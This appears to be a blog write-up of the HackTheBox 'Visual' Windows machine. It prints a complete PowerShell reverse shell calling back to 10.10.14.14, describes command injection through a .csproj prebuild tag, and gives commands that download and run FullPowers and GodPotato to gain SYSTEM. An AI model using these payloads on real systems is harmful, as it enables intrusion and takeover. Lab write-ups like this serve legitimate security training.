---
layout: post
title: "Visual-Windows-Medium"
date:   2025-07-10 12:05:57 -0400
categories: writeups
thumb: /assets/images/logos/a75ac8ed04e6e728547538bfa41cfc68.webp
---

# Visual

HackTheBox: Medium

<aside>
üí° Visual is a windows machine which handles with repositories and build visual studio projects

</aside>

## 1: Enumeration
<br/><br/>
- nmap scanning
<br/><br/>
![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png' | relative_url }})
<br/><br/>
We find there‚Äôs a http service hosted in apache with php
<br/><br/>
![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png' | relative_url }})
<br/><br/>
This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.
<br/><br/>
First at all we test functionality
<br/><br/>
To get into the machine successfully we need some files:
<br/><br/>
1. A repository with c# code
2. A file .csproj and .sln
3. A rev shell to access to the machine once the code is injected
<br/><br/>
> The machine doesn‚Äôt have access to internet therefore we need to run a private server where we could get the repo, we get this in this way
> 
<br/><br/>
```bash
git --bare clone external_repo
cd repo/.git
git --bare update-server-info
mv hooks/post-updte.sample hooks/post-update
cd ..
python -m http.server 8000
```
<br/><br/>
> .csproj = This file has the possibility of iinject commands through prebuild tag.
> 
<br/><br/>
![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png' | relative_url }})
<br/><br/>
## 2: User flag
<br/><br/>
```bash
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.14', 2222);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```
<br/><br/>
Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso 
<br/><br/>
```powershell
cmd /c type c:\Users\enox\Desktop\user.txt
```
<br/><br/>
## 3: Priv esc
<br/><br/>
wrapper pred:
<br/><br/>
```powershell
cd C:\xampp\htdocs\uploads
```
<br/><br/>
Revisamos privilegios
<br/><br/>
```powershell
whoami /priv
```
<br/><br/>
Check some privileges and look ‚ÄúImpersonatePrivilege‚Äù is not present
<br/><br/>
![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png' | relative_url }})
<br/><br/>
We cannot modify or access to files but we can create them
<br/><br/>
Use the server early running and add fullpowers, a POC that rest default privileges
<br/><br/>
With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly
<br/><br/>
```powershell
cmd /c powershell Invoke-WebRequest -Uri http://10.10.00.000:0000/fullpowers.exe -OutFile Fullpowers.exe
fullpowers.exe
```
<br/><br/>
![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png' | relative_url }})
<br/><br/>
We got all priv is time to use godpotato and get the whole power
<br/><br/>
```powershell
powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/GodPotato.exe -OutFile GodPotato.exe
godPotato-NET64 -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```
<br/><br/>
There was a problem, godpotato which will allow us to run commands as system had 3 exe‚Äôs and only the 64 one worked
<br/><br/>
Machine pwned!!
<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>


<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
